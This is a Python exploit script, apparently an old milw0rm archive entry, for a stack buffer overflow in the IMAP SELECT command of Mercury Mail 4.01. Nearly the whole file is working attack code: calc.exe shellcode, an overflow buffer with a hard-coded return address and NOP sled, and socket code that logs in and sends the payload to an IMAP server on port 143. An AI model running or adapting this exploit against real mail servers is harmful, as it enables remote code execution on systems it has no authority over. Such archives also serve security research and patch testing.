                                                                                                                                                                                                                                                               
#########################################################
#                                                       #
# Mercury Mail 4.01 (Pegasus) IMAP Buffer Overflow     	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# WWW.WHITEHAT.CO.IL                                    #
# Plain vanilla stack overflow in the SELECT command  	#
#                                                       #
#########################################################


import struct
import socket
from time import sleep

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lame calc.exe shellcode - dont expect miracles!

sc2 = \"\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x31\\xc9\\xb1\\x29\\x81\\x73\\x17\\xb1\\x74\"
sc2 += \"\\x3f\\x7c\\x83\\xeb\\xfc\\xe2\\xf4\\x4d\\x9c\\x69\\x7c\\xb1\\x74\\x6c\\x29\\xe7\"
sc2 += \"\\x23\\xb4\\x10\\x95\\x6c\\xb4\\x39\\x8d\\xff\\x6b\\x79\\xc9\\x75\\xd5\\xf7\\xfb\"
sc2 += \"\\x6c\\xb4\\x26\\x91\\x75\\xd4\\x9f\\x83\\x3d\\xb4\\x48\\x3a\\x75\\xd1\\x4d\\x4e\"
sc2 += \"\\x88\\x0e\\xbc\\x1d\\x4c\\xdf\\x08\\xb6\\xb5\\xf0\\x71\\xb0\\xb3\\xd4\\x8e\\x8a\"
sc2 += \"\\x08\\x1b\\x68\\xc4\\x95\\xb4\\x26\\x95\\x75\\xd4\\x1a\\x3a\\x78\\x74\\xf7\\xeb\"
sc2 += \"\\x68\\x3e\\x97\\x3a\\x70\\xb4\\x7d\\x59\\x9f\\x3d\\x4d\\x71\\x2b\\x61\\x21\\xea\"
sc2 += \"\\xb6\\x37\\x7c\\xef\\x1e\\x0f\\x25\\xd5\\xff\\x26\\xf7\\xea\\x78\\xb4\\x27\\xad\"
sc2 += \"\\xff\\x24\\xf7\\xea\\x7c\\x6c\\x14\\x3f\\x3a\\x31\\x90\\x4e\\xa2\\xb6\\xbb\\x5a\"
sc2 += \"\\x6c\\x6c\\x14\\x29\\x8a\\xb5\\x72\\x4e\\xa2\\xc0\\xac\\xe2\\x1c\\xcf\\xf6\\xb5\"
sc2 += \"\\x2b\\xc0\\xaa\\xdb\\x74\\xc0\\xac\\x4e\\xa4\\x55\\x7c\\x59\\x95\\xc0\\x83\\x4e\"
sc2 += \"\\x17\\x5e\\x10\\xd2\\x5a\\x5a\\x04\\xd4\\x74\\x3f\\x7c\"

#Change RET Address as needed
buffer = \'\\x41\'*260 +  struct.pack(\'<L\', 0x782f28f7)+ \'\\x90\'*32+sc2

print \"\\nSending evil buffer...\"
s.connect((\'192.168.1.167\',143))
s.send(\'a001 LOGIN ftp ftp\' + \'\\r\\n\')
data = s.recv(1024)
sleep(3)
s.send(\'A001 SELECT \' + buffer+\'\\r\\n\')
data = s.recv(1024)
s.close()
print \"\\nDone! \"

# milw0rm.com [2004-11-29]
